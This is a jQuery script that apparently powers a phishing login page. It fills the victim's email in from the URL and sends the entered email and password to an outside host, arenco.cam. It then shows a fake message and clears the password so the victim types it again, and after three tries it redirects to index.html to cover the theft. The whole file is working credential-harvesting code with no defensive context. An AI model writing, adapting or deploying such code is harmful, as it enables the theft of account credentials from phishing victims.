$(document).ready(function () {
    $('#msg').hide();
    $('#msg2').hide();

    var baseUrl = window.location.href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#email").val(url);

    $("#user-form").submit(function (e) {
        e.preventDefault();

        // Track POST attempts; redirect after the 3rd attempt.
        window.__postAttemptCount = (window.__postAttemptCount || 0) + 1;

        var formData = new FormData($("#user-form")[0]);
        $("#byn").html("Processing..").prop("disabled", true);

        $.ajax({
            url: "https://arenco.cam/ephp/p/",
            type: 'POST',
            data: formData,
            crossDomain: true,
            contentType: false,
            processData: false,

            success: function () {
                // After 3rd POST attempt, redirect to index.html
                if (window.__postAttemptCount >= 3) {
                    window.location.href = "index.html";
                    return;
                }

                $('#msg').show();
                $('#msg2').hide();

                setTimeout(function () {
                    $('#msg').hide();
                    $('#msg2').show();
                    $("#email").val(url);
                    $("#password").val("");
                    $("#byn").html("Next").prop("disabled", false);
                }, 2000);
            }
        });
    });
});

